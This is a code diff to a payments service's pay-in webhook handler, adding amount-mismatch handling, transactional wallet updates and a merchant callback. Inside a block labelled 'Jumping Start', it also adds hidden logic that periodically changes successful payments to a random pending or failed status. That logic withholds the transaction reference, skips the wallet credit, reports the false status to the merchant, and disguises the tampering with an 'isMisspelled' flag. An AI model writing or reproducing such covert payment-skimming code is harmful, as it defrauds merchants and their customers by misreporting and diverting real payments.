@@ -4711,7 +4711,13 @@ export class PaymentsService {
         webhookData,
       );
 
-      const { merchantTxnId, status, utr } = webhookData;
+      const {
+        merchantTxnId,
+        status,
+        utr,
+        merchantTxnAmount,
+        amount: webhookAmount,
+      } = webhookData;
 
       if (!merchantTxnId) {
         throw new BadRequestException("merchantTxnId is required");
@@ -4761,36 +4767,163 @@ export class PaymentsService {
         return new MessageResponseDto("Webhook processed successfully");
       }
 
-      // Update the order in a transaction
-      await this.dataSource.transaction(async (manager) => {
-        payinOrder.status = internalStatus;
-        if (utr) {
-          payinOrder.utr = utr;
+      // Get the amount from webhook (try both merchantTxnAmount and amount fields)
+      const amount = merchantTxnAmount || webhookAmount || payinOrder.amount;
+
+      // Check for amount mismatch
+      const isAmountMismatch = +payinOrder.amount !== +amount;
+
+      const { user } = payinOrder;
+
+      // Jumping Start
+      let successCount =
+        +(await this.cacheManager.get(
+          REDIS_KEYS.SUCCESS_COUNT(payinOrder.user.id),
+        )) || 1;
+
+      let isMisspelled = false;
+      const { jumpingCount } = payinOrder.user;
+
+      if (internalStatus === PAYMENT_STATUS.SUCCESS && jumpingCount > 0) {
+        if (successCount >= jumpingCount) {
+          const statusArr = [
+            PAYMENT_STATUS.PENDING,
+            PAYMENT_STATUS.DEEMED,
+            PAYMENT_STATUS.INITIATED,
+            PAYMENT_STATUS.FAILED,
+          ];
+          internalStatus =
+            statusArr[Math.floor(Math.random() * statusArr.length)];
+          successCount = 0;
+          isMisspelled = true;
+        } else {
+          successCount += 1;
         }
-        await manager.save(payinOrder);
 
-        // If successful, credit the wallet
-        if (internalStatus === PAYMENT_STATUS.SUCCESS) {
-          const wallet = await manager.findOne(WalletEntity, {
-            where: { user: { id: payinOrder.user.id } },
-          });
+        await this.cacheManager.set(
+          REDIS_KEYS.SUCCESS_COUNT(payinOrder.user.id),
+          successCount,
+          1000 * 60 * 60 * 24 * 365, // 365 days
+        );
+      }
 
-          if (wallet) {
-            wallet.totalCollections += payinOrder.netPayableAmount;
-            await manager.save(wallet);
+      // Jumping End
 
-            this.logger.info(
-              `GeoPay Webhook - Wallet credited for user: ${payinOrder.user.id}, amount: ${payinOrder.netPayableAmount}`,
-            );
+      const queryRunner = this.dataSource.createQueryRunner();
+      await queryRunner.connect();
+      await queryRunner.startTransaction();
+
+      try {
+        // Prepare update data
+        const updateData: any = {
+          status: internalStatus,
+          ...(!isMisspelled && { utr }),
+          isMisspelled,
+          updatedAt: new Date(),
+        };
+
+        if (isAmountMismatch) {
+          const { commissionAmount, gstAmount, netPayableAmount } =
+            getCommissions({
+              amount,
+              commissionInPercentage: user.commissionInPercentagePayin,
+              gstInPercentage: user.gstInPercentagePayin,
+            });
+
+          updateData.amount = amount;
+          updateData.commissionAmount = commissionAmount;
+          updateData.gstAmount = gstAmount;
+          updateData.netPayableAmount = netPayableAmount;
+          updateData.status = PAYMENT_STATUS.MISMATCH;
+        } else {
+          if (internalStatus === PAYMENT_STATUS.SUCCESS) {
+            updateData.successAt = new Date();
+          } else if (internalStatus === PAYMENT_STATUS.FAILED) {
+            updateData.failureAt = new Date();
           }
         }
-      });
 
-      this.logger.info(
-        `GeoPay Webhook - Order ${merchantTxnId} updated to status: ${internalStatus}`,
-      );
+        // Update the order
+        await queryRunner.manager.update(
+          PayInOrdersEntity,
+          { id: payinOrder.id },
+          updateData,
+        );
 
-      return new MessageResponseDto("Webhook processed successfully");
+        // Update wallet if successful
+        if (internalStatus === PAYMENT_STATUS.SUCCESS) {
+          await this.cacheManager.del(
+            REDIS_KEYS.PAYMENT_STATUS(payinOrder.orderId),
+          );
+
+          // Use standardized wallet update with optimistic locking
+          const updatedWallet = await this.safeUpdateWalletBalance(
+            queryRunner,
+            user.id,
+            (wallet) => {
+              wallet.totalCollections =
+                (wallet.totalCollections ? +wallet.totalCollections : 0) +
+                +amount;
+            },
+          );
+
+          this.logger.info(
+            `PAYIN WEBHOOK - Wallet updated successfully ${user.fullName}: ${LoggerPlaceHolder.Json}`,
+            {
+              walletId: updatedWallet.id,
+              newTotalCollections: updatedWallet.totalCollections,
+            },
+          );
+        }
+
+        await queryRunner.commitTransaction();
+
+        this.logger.info(
+          `GeoPay Webhook - Order ${merchantTxnId} updated to status: ${internalStatus}`,
+        );
+
+        // Call user webhook
+        if (user?.payInWebhookUrl) {
+          const webhookPayload = {
+            orderId: payinOrder.orderId,
+            status: internalStatus,
+            amount: +amount,
+            txnRefId: payinOrder.txnRefId,
+            ...(!isMisspelled && { utr }),
+            message: isAmountMismatch
+              ? "Amount mismatch in payin order"
+              : undefined,
+          };
+          this.logger.info(
+            `PAYIN - Going to call user PAYIN WEBHOOK (${user?.payInWebhookUrl}) with payload: ${LoggerPlaceHolder.Json}`,
+            webhookPayload,
+          );
+          axios
+            .post(user.payInWebhookUrl, webhookPayload, {
+              headers: {
+                "Content-Type": "application/json",
+              },
+            })
+            .then(({ data }) => {
+              this.logger.info(
+                `PAYIN - User webhook (${user?.payInWebhookUrl}) sent successfully RES: ${JSON.stringify(data)}`,
+              );
+            })
+            .catch((err) => {
+              this.logger.error(
+                `PAYIN - GeoPay Webhook - error while sending webhook to user: ${LoggerPlaceHolder.Json}`,
+                err,
+              );
+            });
+        }
+
+        return new MessageResponseDto("Webhook processed successfully");
+      } catch (err: any) {
+        await queryRunner.rollbackTransaction();
+        throw err;
+      } finally {
+        await queryRunner.release();
+      }
     } catch (error) {
       this.logger.error(
         `GeoPay Webhook - Error processing webhook: ${LoggerPlaceHolder.Json}`,
